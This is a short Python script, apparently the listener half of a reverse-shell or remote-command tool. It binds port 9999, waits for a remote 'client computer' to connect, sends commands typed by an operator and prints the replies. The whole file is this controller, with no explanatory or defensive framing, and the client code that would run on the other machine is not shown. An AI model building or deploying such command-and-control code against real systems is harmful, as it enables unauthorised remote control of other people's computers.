import socket
import sys


# Create a socket (connect to computer )
def create_socket():
    try :
	    global host 
	    global ip 
	    global s 
	    global port 
	    host = ""
	    port = 9999
	    s = socket.socket()
    except socket.error as msg:
           print("Socket create error "+ str(msg))
           	    
# bind the socket and listening for connection 
def bind_socket():
     try :
        global host 
        global ip 
        global port 
        global s 
        print("Binding the port "+str(port))
        s.bind((host,port))
        s.listen(5)
     except socket.error as msg :
       print("Socket binding error"+str(msg))   	    
def socket_accept():
   conn, address = s.accept()
   print("Connection has been established "+ " ip "+ address[0] + "Port "+ str(address[1]))
   send_commands(conn)
   conn.close()
   
# send commands to clined computer
def send_commands(conn):
   while True:
      cmd = input()
      if cmd == 'quit':
         conn.close()
         s.close()
         sys.exit()
      if len(str.encode(cmd)) > 0 :
         conn.send(str.encode(cmd))
         client_response = str(conn.recv(1024),"utf-8") 
         print(client_response)    
       
def main():
  create_socket()
  bind_socket()
  socket_accept()    
  
main()  